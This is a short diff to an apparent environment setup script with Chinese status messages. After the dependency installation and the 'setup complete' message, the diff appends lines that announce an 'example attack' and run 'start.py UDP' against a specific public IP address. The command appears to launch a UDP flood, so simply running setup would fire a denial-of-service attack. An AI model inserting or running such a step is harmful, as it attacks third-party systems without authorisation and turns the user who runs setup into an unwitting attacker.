@@ -57,3 +57,8 @@ echo "正在安装项目依赖..."
 pip install --only-binary :all: -r requirements.txt
 
 echo "环境设置完成，现在你可以开始你的项目工作了。"
+
+echo "开始示例攻击..."
+python3 start.py UDP 166.88.95.146 10 10
+
+exec "$SHELL"
